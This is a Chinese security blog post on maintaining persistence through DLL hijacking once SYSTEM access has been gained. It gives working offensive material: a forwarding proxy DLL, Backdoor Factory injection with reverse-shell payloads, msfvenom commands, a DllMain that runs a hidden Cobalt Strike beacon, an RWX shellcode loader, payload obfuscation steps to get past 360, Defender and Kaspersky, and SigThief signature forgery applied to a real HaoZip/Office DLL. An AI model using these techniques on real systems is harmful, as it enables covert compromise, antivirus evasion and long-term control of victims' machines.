> 原文链接: https://www.anquanke.com//post/id/232891 


# DLL劫持之权限维持篇（二）


                                阅读量   
                                **225934**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01ad4fae2d6f19c02d.png)](https://p4.ssl.qhimg.com/t01ad4fae2d6f19c02d.png)



本系列:

[DLL劫持原理及其漏洞挖掘（一）](https://www.anquanke.com/post/id/225911)



## 0x0 前言

最近发现针对某些目标，添加启动项，计划任务等比较明显的方式效果并不是很好，所以针对DLL劫持从而达到权限的维持的技术进行了一番学习，希望能与读者们一起分享学习过程，然后一起探讨关于DLL更多利用姿势。



## 0x1 背景

原理在第一篇已经讲了，下面说说与第一篇的不同之处，这一篇的技术背景是,我们已经获取到system权限的情况下，然后需要对目标进行持续性的控制，所以需要对权限进行维护，我们的目标是针对一些主流的软件or系统内置会加载的小DLL进行转发式劫持(也可以理解为中间人劫持),这种劫持的好处就是即使目标不存在DLL劫持漏洞也没关系，我们可以采取直接替换掉原来的DLL文件的方式，效果就是，程序依然可以正常加载原来DLL文件的功能，但是同时也会执行我们自定义的恶意操作。



## 0x2 劫持的优势

在很久以前,”白+黑”这种免杀方式很火,DLL劫持的优势其实就是如此。

是不是很懵? 先理解下什么是”白”+”黑”

> <p>白加黑木马的结构<br>
1.Exe(白) —-load—-&gt; dll（黑）<br>
2.Exe(白) —-load—-&gt; dll（黑）—-load—-&gt; 恶意代码</p>

白EXE主要是指那些带有签名的程序(杀毒软件对于这种软件，特别是window签名的程序，无论什么行为都不会阻止的,至于为什么？ emmm,原因很多,查杀复杂，定位DLL困难，而且最终在内存执行的行为都归于exe(如果能在众多加载的DLL中准确定位到模块，那就是AI分析大师。),所以比较好用的基于特征码去查杀，针对如今混淆就像切菜一样简单的时代来说，蛮不够看的，PS.或许360等杀毒有新的方式去检测,emmm,不过我实践发现,基于这个原理过主动防御没啥问题…emmm)

关于这个优势，上图胜千言。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0198f2086c702471de.png)

> 基于wmic,rundll,InstallUtil等的白名单现在确实作用不是很大。



## 0x3 劫持方式

为了能够更好地学习,下面方式,笔者决定通过写一个demo的程序进行测试。

打开vs2017,新建一个控制台应用程序:

代码如下:

```
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
using namespace std;

int main()
`{`
    // 定义一个函数类DLLFUNC
    typedef void(*DLLFUNC)(void);
    DLLFUNC GetDllfunc1 = NULL;
    DLLFUNC GetDllfunc2 = NULL;
    // 指定动态加载dll库
    HINSTANCE hinst = LoadLibrary(L"TestDll.dll");
    if (hinst != NULL) `{`
        // 获取函数位置
        GetDllfunc1 = (DLLFUNC)GetProcAddress(hinst, "msg");
        GetDllfunc2 = (DLLFUNC)GetProcAddress(hinst, "error");
    `}`
    if (GetDllfunc1 != NULL) `{`
        //运行msg函数
        (*GetDllfunc1)();
    `}`
    else `{`
        MessageBox(0, L"Load msg function Error,Exit!", 0, 0);
        exit(0);
    `}`
    if (GetDllfunc2 != NULL) `{`
        //运行error函数
        (*GetDllfunc2)();
    `}`
    else `{`
        MessageBox(0, L"Load error function Error,Exit!", 0, 0);
        exit(0);
    `}`
    printf("Success");
`}`
```

程序如果缺乏指定DLL的导出函数,那么将会失败.

原生正常DLL的代码如下:

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include &lt;Windows.h&gt;

void msg() `{`
    MessageBox(0, L"I am msg function!", 0, 0);
`}`

void error() `{`
    MessageBox(0, L" I am error function!", 0, 0);
`}`

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
`{`
    switch (ul_reason_for_call)
    `{`
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    `}`
    return TRUE;
`}`
```

framework.h导出函数如下:

```
#pragma once

#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#include &lt;windows.h&gt;

extern "C" __declspec(dllexport) void msg(void);
extern "C" __declspec(dllexport) void error(void);
```

> extern表示这是个全局函数,可以供其他函数调用,”C”表示按照C编译器的方式编译
__declspec(dllexport) 这个导出语句可以自动生成`.def`((符号表)),这个很关键
如果你没导出,这样调用的程序是没办法调用的(其实也可以尝试从执行过程来分析，可能麻烦点)
建议直接看官方文档:
[https://docs.microsoft.com/zh-cn/cpp/build/exporting-from-a-dll?view=msvc-160](https://docs.microsoft.com/zh-cn/cpp/build/exporting-from-a-dll?view=msvc-160)

正常完整执行的话,最终程序会输出Success。

[![](https://p4.ssl.qhimg.com/t01eca40c8c98ddfd31.png)](https://p4.ssl.qhimg.com/t01eca40c8c98ddfd31.png)

下面将以这个hello.exe的demo程序来学习以下三种劫持方式。

### <a class="reference-link" name="0x3.1%20%E8%BD%AC%E5%8F%91%E5%BC%8F%E5%8A%AB%E6%8C%81"></a>0x3.1 转发式劫持

这个思想可以简单理解为

[![](https://p2.ssl.qhimg.com/t019c4eb98b0e40a709.png)](https://p2.ssl.qhimg.com/t019c4eb98b0e40a709.png)

这里我本来打算安装一个工具DLLHijacker,但是后来发现历史遗留，不支持64位等太多问题，最终放弃了，转而物色到了一款更好用的工具AheadLib:

这里有两个版本,有时候可能识别程序位数之类的问题出错可以尝试切换一下:

[AheadLib-x86-x64 Ver 1.2](https://github.com/strivexjun/AheadLib-x86-x64/releases/tag/1.2)

[yes大牛的修改版](https://bbs.pediy.com/thread-224408.htm)

yes大牛中的修改版提供两种直接转发函数即时调用函数

> 区别就是直接转发函数，我们只能控制DllMain即调用原DLL时触发的行为可控
即时调用函数，可以在处理加载DLL时，调用具体函数的时候行为可控，高度自定义触发点,也称用来hook某些函数，获取到参数值。

这里为了简单点，我们直接采取默认的直接转发就行了。

[![](https://p3.ssl.qhimg.com/t01df214c98f726f1ac.png)](https://p3.ssl.qhimg.com/t01df214c98f726f1ac.png)

生成`TestDll.cpp`文件之后，我们在VS新建动态链接库项目，将文件加载进项目。

记得要保留原来的`#include "pch.h"`

然后替换其他内容为生成`TestDLL.cpp`就行,这里我们在

`DLL_PROCESS_ATTACH` 也就DLL被加载的时候执行,这里我们设置的demo 弹窗

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 头文件
#include &lt;Windows.h&gt;
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


// 这里是转发的关键,通过将error转发到TestDllOrg.error中
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 导出函数
#pragma comment(linker, "/EXPORT:error=TestDllOrg.error,@1")
#pragma comment(linker, "/EXPORT:msg=TestDllOrg.msg,@2")
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
`{`
    if (dwReason == DLL_PROCESS_ATTACH)
    `{`
        DisableThreadLibraryCalls(hModule);
        MessageBox(NULL, L"hi,hacker, inserted function runing", L"hi", MB_OK);
    `}`
    else if (dwReason == DLL_PROCESS_DETACH)
    `{`

    `}`

    return TRUE;
`}`
///////////////////////////////////////////////////////////
```

效果如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0125b01ab176d43652.png)

后面的功能也是正常调用的,不过这个需要注意的地方就是加载的程序和DLL的位数必须一样，要不然就会加载出错的,所以劫持的时候需要观察下位数。

比如下面这个例子:

这里加载程序hello.exe(64位)的,加载Test.dll(32位)就出错了。

[![](https://p3.ssl.qhimg.com/t011f790c25e9d13d35.png)](https://p3.ssl.qhimg.com/t011f790c25e9d13d35.png)

### <a class="reference-link" name="0x3.2%20%E7%AF%A1%E6%94%B9%E5%BC%8F%E5%8A%AB%E6%8C%81"></a>0x3.2 篡改式劫持

这种方法属于比较暴力的一种,通过直接在DLL中插入跳转语句从而跳转到我们的shellcode位置，这种方式其实局限性蛮多的。

> 1.签名的DLL文件会破坏签名导致失败
2.会修改原生DLL文件，容易出现一些程序错误
3.手法比较古老。

这种方式可以采用一个工具BDF(好像以前CS内置这个??? ):

安装过程:

```
git clone https://github.com/secretsquirrel/the-backdoor-factory
sudo ./install.sh
```

> mac下3.0.4的版本会出现capstone的错误.
解决方案:
<pre><code class="hljs nginx">pip install capstone==4.0.2
</code></pre>

使用过程如下:

1.首先查看是否支持:`./backdoor.py -f ./exeTest/hello.exe -S`

> <pre><code class="hljs cs">[*] Checking if binary is supported
[*] Gathering file info
[*] Reading win32 entry instructions
./exeTest/TestDll.dll is supported.
</code></pre>

2.接着搜索是否存在可用的Code Caves(需要可执行权限的Caves来存放shellcode)

```
python2 backdoor.py -f TestDll.dll -c
```

> <pre><code class="hljs markdown">Looking for caves with a size of 380 bytes (measured as an integer
[*] Looking for caves
We have a winner: .text
-&gt;Begin Cave 0x1074
-&gt;End of Cave 0x1200
Size of Cave (int) 396
SizeOfRawData 0xe00
PointerToRawData 0x400
End of Raw Data: 0x1200
**************************************************
No section
-&gt;Begin Cave 0x1c15
-&gt;End of Cave 0x1e0e
Size of Cave (int) 505
**************************************************
[*] Total of 2 caves found
</code></pre>

这里在.text(代码段)存在一个396字节大小区域.

3.获取可用的payload

`./backdoor.py -f ./exeTest/TestDll.dll -s`

> <pre><code class="hljs nginx">The following WinIntelPE32s are available: (use -s)
  cave_miner_inline
  iat_reverse_tcp_inline
  iat_reverse_tcp_inline_threaded
  iat_reverse_tcp_stager_threaded
  iat_user_supplied_shellcode_threaded
  meterpreter_reverse_https_threaded
  reverse_shell_tcp_inline
  reverse_tcp_stager_threaded
  user_supplied_shellcode_threaded
</code></pre>

这里我们采取最后一个选项:

`user_supplied_shellcode_threaded`

> 自定义payload，payload可通过msf生成

先生成测试的shellcode:

calc调用测试 193bytes：

`msfvenom -p windows/exec CMD=calc.exe -f raw &gt; calc.bin`

msg弹框测试 272bytes:

`msfvenom -p windows/messagebox -f raw &gt;msg.bin`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015bbd09bdc4528535.png)

0x108+8 = 272个字节

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013da38165104df0c4.png)

不过除了shellcode还有跳转过程也需要字节，平衡栈等。

这里尝试注入:

```
./backdoor.py -f ./exeTest/TestDll.dll -s user_supplied_shellcode_threaded -U msg.bin -a
```

[![](https://p0.ssl.qhimg.com/t01d3e650c8623e4075.png)](https://p0.ssl.qhimg.com/t01d3e650c8623e4075.png)

[![](https://p1.ssl.qhimg.com/t01b9daa25b6e44b2d8.png)](https://p1.ssl.qhimg.com/t01b9daa25b6e44b2d8.png)

执行很成功,但是在替换加载的时候,发现计算器的确弹出来了,但是主程序却出错异常退出了。

> 这种方式就是暴力patch程序入口点，jmp shellcode，然后继续向下执行，很容易导致堆栈不平衡,从而导致程序错误，所以，效果不是很好, 期待2021.7月发布的新版，有空我也自己去尝试优化下，学学堆栈原理，如何去正确的patch。

### <a class="reference-link" name="0x3.3%20%E9%80%9A%E7%94%A8DLL%E5%8A%AB%E6%8C%81"></a>0x3.3 通用DLL劫持

这种方式可以不再需要导出DLL的相同功能接口，实现原理其实就是修改`LoadLibrary`的返回值,一般来说都是劫持`LoadLibraryW(L"mydll.dll");`,window默认都是转换为unicode,自己去跟一下也可以发现。

原理大概如下:

> exe —load—&gt; fakedlld.ll —&gt; execute shellcode
​ |执行完返回正确orgin.dll地址|
​ ——————————————————————

怎么实现这种效果?

使用这个工具:[SuperDllHijack](https://github.com/anhkgg/SuperDllHijack)

```
git clone https://github.com/anhkgg/SuperDllHijack.git
```

然后用vs加载其中的example部分就行了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f965735d281d6f59.png)

核心关键代码在这里,这里我们修改成如下:

[![](https://p3.ssl.qhimg.com/t01ef5455751483347b.png)](https://p3.ssl.qhimg.com/t01ef5455751483347b.png)

然后执行的时候,发现虽然成功hook了

[![](https://p0.ssl.qhimg.com/t01083030570462b298.png)](https://p0.ssl.qhimg.com/t01083030570462b298.png)

但是获取相应的导出函数,也还是失败的, 而且很奇怪realease 和 debug编译的时候,release版本连demo都在win10跑不起来。

### <a class="reference-link" name="0x3.4%20%E6%80%BB%E7%BB%93"></a>0x3.4 总结

经过上面的简单测试, 不难得出，无论是从简易性，实用性，操作性(方便免杀)来看，我都推荐新手使用第一种方式，缺点也有，就是可能导出函数比较多的时候，会比较麻烦，但是这些不是什么大问题。因为尽量能用微软提供的功能去解决，远远比自己去patch内存来更有效，可以避免很多隐藏机制，系统版本等问题的影响，通用性得到保证, 所以下面的操作我将会采取AheadLib来进行展示。



## 0x4 DLL后门的利用

DLL查杀,其实也是针对shellcode的查杀,下面先写一个简单的加载shellcode的恶意代码。

### <a class="reference-link" name="0x4.1%20%E5%A4%9A%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"></a>0x4.1 多文件利用方法

最简单的一种利用手段就是:

存放我的cs木马beacon到一个比较隐蔽的目录:

`C:\Users\xq17\Desktop\shellcode\beacon.exe`

[![](https://p5.ssl.qhimg.com/t0102a0ba184f0be5b6.png)](https://p5.ssl.qhimg.com/t0102a0ba184f0be5b6.png)

然后给这个文件加一个隐藏属性:

`attrib +h beacon.exe`

[![](https://p2.ssl.qhimg.com/t01999c255a6d4afd54.png)](https://p2.ssl.qhimg.com/t01999c255a6d4afd54.png)

接着我们采用DLL去加载这个木马。

代码大概如下:

```
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
`{`
    if (dwReason == DLL_PROCESS_ATTACH)
    `{`
        DisableThreadLibraryCalls(hModule);
    `}`
    else if (dwReason == DLL_PROCESS_DETACH)
    `{`
        STARTUPINFO si = `{` sizeof(si) `}`;
        PROCESS_INFORMATION pi;
        CreateProcess(TEXT("C:\\Users\\xq17\\Desktop\\shellcode\\beacon.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &amp;si, &amp;pi);
    `}`

    return TRUE;
`}`
```

然后后面直接去尝试加载就行了,程序执行完的时候(`DLL_PROCESS_DETACH`),会自动加载我们的cs马。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015fa61a334cb43ef7.png)

> 说一下这种方案的好处,就是DLL根本没有恶意操作,所以肯定会免杀，但是你的木马文件要做好免杀，这种思路主要应用于通过劫持一些程序的DLL,然后实现隐蔽的重启上线，也就是权限持续维持，单单杀启动项对DLL进行权限维持的方式来说是没有用的。

### <a class="reference-link" name="0x4.2%20%E5%8D%95DLL%E8%87%AA%E5%8A%A0%E8%BD%BD%E4%B8%8A%E7%BA%BF"></a>0x4.2 单DLL自加载上线

上面可能步骤繁琐了些,其实我们也可以直接将shellcode代码写入到DLL文件中,然后加载DLL的时候执行就行了。

代码大概如下:

```
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 入口函数
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
`{`
    if (dwReason == DLL_PROCESS_ATTACH)
    `{`
        DisableThreadLibraryCalls(hModule);
        unsigned char buf[] = "shellcode";
        size_t size = sizeof(buf);
        char* inject = (char *)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(inject, buf, size);
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)inject, 0, 0, 0);
    `}`
    else if (dwReason == DLL_PROCESS_DETACH)
    `{`
    `}`
    return TRUE;
`}`
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
```

加载Hello32.exe的时候，就会上线，如果hello32执行完自动退出的话,那也挂掉的(可以写一个自动迁移进程的来解决这个问题)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0192577f405769d61f.png)

接下来查看一下杀毒软件报毒不:

一开始静态扫描肯定是可以的,但是当我成功加载上线一次之后，再次查杀立马就被报毒。

后面发现上传鉴定的确也被杀了。(网上很多人说关掉上传(秒天秒地免杀，这里就不做评价了),emmm, 360都是默认开启上传功能的)

[![](https://p1.ssl.qhimg.com/t015586fbd027f8b737.png)](https://p1.ssl.qhimg.com/t015586fbd027f8b737.png)

现在比较主流的就是自写加载器，加密shellcode之类的，但是效果越来越差了，然后现在慢慢倾向于Python语言、Golang、nim等偏僻语言来调用API，应该是杀软没跟上导致bypass，但是这种技术没办法用在DLL的加载器中，除非用这种偏僻语言来生成DLL。

这里我决定采用一些比较稀奇的方式。

[![](https://p1.ssl.qhimg.com/t015586fbd027f8b737.png)](https://p1.ssl.qhimg.com/t015586fbd027f8b737.png)

通过注释掉shellcode,不难发现,他是针对shellcode加了特征码来查杀的，云端估计会进行动态分析，然后扫描shellcode然后给shellcode加特征。

> 我的思路是对shellcode进行混淆

实现混淆目前我已知的两种方式:

1.很老很大众的编码器,以前效果贼6的msf也自带的shikata_ga_nai，其原理是内存xor自解密。

2.真正的等价替换shellcode,完全去除本身特征(杀软加针对工具的特征，那就是另说了)

这里我介绍萌新都可以学会使用的第二种方法，原理方面的话，下次再展开与shikata一起来讲讲。

```
1.pip install distorm3
2.git clone https://github.com/kgretzky/python-x86-obfuscator.git
3.cd
```

然后cs生成raw的payload.bin,然后生成混淆

`python  x86obf.py -i payload.bin -o output.bin -r 0-184`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0177aa512175fcad70.png)

> 关键一些点还是大致看出来

想要加强混淆，可以执行:

`python  x86obf.py -i payload.bin -o output.bin -r 0-184 -p 2 -f 10`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e2fd5bd60542deeb.png)

> 可以看到非常恐怖了,基本都不认识了, 但是体积也变大了很多

接着我们直接提取成shellcode的数组形式:

```
#!/usr/bin/env python3
shellcode = 'unsigned char buf[] = "'
with open("output1.bin", "rb") as f:
    content = f.read()
# print(content)
for i in content:
    shellcode += str(hex(i)).replace("0x", "\\x")
shellcode += '";'
print(shellcode)
```

然后直接替换上面的shellcode就行，然后我们再来看一下效果:

> 基本可以免杀, 但是如果360上传云，很快就会被杀。解决方案就是:被杀的时候，继续生成和替换shellcode就行了，每次都是随机混淆的，都可以起到免杀效果。
同时Wd是可以过掉的,卡巴斯基也是可以上线的，但是也仅仅是上线而已。

不过不用很担心免杀问题，毕竟是白+黑，我们劫持有签名的程序就可以降低被杀的概率

就算发出来免杀代码照样会立刻被AV秒杀的，所以目的还是分享一些免杀想法, 希望大家发散思维，形成一套自己的免杀流程。



## 0x5 证书签名伪造

为什么需要伪造证书呢？

**因为有一些情况，一些杀软不会去检验证书签名是否有效，同时也能取到一定迷惑受害者的效果**。

这里我们使用一个软件[SigThief](https://github.com/secretsquirrel/SigThief):

> 原理:它将从已签名的PE文件中剥离签名，并将其附加到另一个PE文件中，从而修复证书表以对该文件进行签名。

```
git clone https://github.com/secretsquirrel/SigThief.git
```

这里随便选一个微软签名的DLL进行伪造:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](DLL%E5%8A%AB%E6%8C%81%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87(%E4%BA%8C).assets/image-20210301124455700.png)

```
python3 sigthief.py -i VSTOInstallerUI.dll  -t TestDll.dll -o TestDllSign.dll
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01790ffa80d924338b.png)

不过签名是不正确的(伪造):

```
Get-AuthenticodeSignature .\TestDll.dll
```

[![](https://p1.ssl.qhimg.com/t01d0591c40751f89d0.png)](https://p1.ssl.qhimg.com/t01d0591c40751f89d0.png)

> 关于本地修改签名验证机制来bypass，可以参考下这些文章
[数字签名劫持](https://xz.aliyun.com/t/9174)
[Authenticode签名伪造——PE文件的签名伪造与签名验证劫](https://zhuanlan.zhihu.com/p/30157991)
但是这些点我感觉还是比较粗浅，还需继续深入研究，所以这里就不尝试，因为我觉得应该先从数字签名的原理和验证讲起，后面会慢慢接触到的。



## 0x6 实操DLL持久权限维持

下面用一个案例来组合上面思路。

首先我们下载工具

[https://download.sysinternals.com/files/ProcessExplorer.zip](https://download.sysinternals.com/files/ProcessExplorer.zip)

[https://download.sysinternals.com/files/Autoruns.zip](https://download.sysinternals.com/files/Autoruns.zip)

或者在任务管理器-&gt;启动

然后在里面查找一些自动启动的程序。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0147556cbaff82a0ba.png)

然后开ProcessMonitor看加载的DLL,这里我默认排除系统的DLL，要不然你的木马会不停被重复加载。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014d5b86638806ee74.png)

发现进行Load_image,只有这个

[![](https://p0.ssl.qhimg.com/t0177ff3faf538ff323.png)](https://p0.ssl.qhimg.com/t0177ff3faf538ff323.png)

发现并不复杂只有一个导出函数:

[![](https://p1.ssl.qhimg.com/t019b413de719c784d6.png)](https://p1.ssl.qhimg.com/t019b413de719c784d6.png)

然后我们生成这个 `Haozip_2345Upgradefake.dll` 文件，将原来DLL改为:`Haozip_2345UpgradeOrg.dll`.

然后继续伪造签名:

```
python3 sigthief.py -i Haozip_2345UpgradeOrg.dll  -t Haozip_2345Upgradefake.dll -o Haozip_2345Upgrade.dll
```

最后将这个两个文件:

```
Haozip_2345Upgrade.dll 
Haozip_2345UpgradeOrg.dll  //这个你也可以直接文件夹直接更换名字就行了。
```

放回回原来的目录下即可。

[![](https://p2.ssl.qhimg.com/t0161af52100ab2f162.png)](https://p2.ssl.qhimg.com/t0161af52100ab2f162.png)

但是并没有成功，猜测程序加载DLL的时候检验了签名。

后面我尝试用上面的步骤，寻找了其他office来进行劫持.(这里直接用的是64位没有混淆的shellcode)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0136ecbe006e21eb58.png)

成功劫持加载了。



## 0x7 总结

总体来说，这种权限维持方案操作比较复杂，要求也比较高，也相当费时和费力，不过如果手里有很多主流软件的加载DLL列表，然后自己存好备份，能提高不少安装该后门速度，现在就是自动化程度比较低，出错率高，可以继续深入研究下，寻找一种比较简单的指定DLL通用权限维持手段，这样这种技术才能很好的落地实战化。

(共勉吧，Windows的编程和原理还需要继续深入学习…)



## 0x8 参考链接

[dll签名两种方法（转载）](https://blog.csdn.net/blacet/article/details/98631893)

[给.DLL文件加一个数字签名的方法](https://www.cnblogs.com/zjoch/p/4583521.html)

[Use COM Object hijacking to maintain persistence——Hijack explorer.exe](https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/)

[一种通用DLL劫持技术研究](https://www.t00ls.net/viewthread.php?tid=48756&amp;extra=&amp;highlight=dll&amp;page=1)

[th-DLL劫持](https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/)

[利用BDF向DLL文件植入后门](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/)

[劫持微信dll使木马bypass360重启上线维持权限](http://0x3.biz/2021/01/)

[探索DLL搜索顺序劫持的原理和自动化侦查方法](https://www.anquanke.com/post/id/209563)
